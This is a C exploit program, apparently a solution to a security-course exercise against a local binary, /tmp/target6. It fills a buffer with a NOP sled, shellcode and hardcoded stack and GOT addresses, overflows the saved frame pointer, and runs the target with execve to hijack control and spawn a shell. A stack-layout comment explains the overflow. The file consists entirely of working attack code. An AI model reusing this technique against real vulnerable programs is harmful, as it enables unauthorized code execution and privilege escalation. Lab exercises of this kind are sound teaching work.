#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"
#define NULL_TERM 1
#define PAYLOAD_SIZE (200+NULL_TERM)
#define NOP (0x90)
#define BUF_START (0xbffffc80)
#define NEW_EBP (0xbffffd00)
#define OFFSET ((NEW_EBP & 0xfff)-(BUF_START & 0xfff))
#define GOT_ADDR (0x8049774)
#define SHELL_ADDR (BUF_START)

/*
 *  -----Foo------
 *  Ret Addr to main
 *  -----------
 *  Saved ebp
 *  -----------
 *  int *p  0xbffffe24
 *  ----------
 *  int a=0 0xbffffe20
 *
 *
 *  ----Bar-------
 *  Ret Addr to Foo
 *  --------------
 *  Saved ebp - (E28)overflow to bffffe00
 *  --------------
 *  Buf[200]
 *  -------------
 *
 *
 *
 *
 */

int main(void)
{
    char *args[3];
    char *env[1];
    char payload[PAYLOAD_SIZE];

    /* Build payload */
    memset(payload, NOP, PAYLOAD_SIZE);
    payload[PAYLOAD_SIZE-1] = '\0';
    *(int *)(payload + OFFSET - 4) = GOT_ADDR;
    *(int *)(payload + OFFSET - 8) = SHELL_ADDR;
    memcpy(payload, shellcode, strlen(shellcode));


    args[0] = TARGET;
    args[1] = payload;
    args[2] = NULL;
    env[0] = NULL;


    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
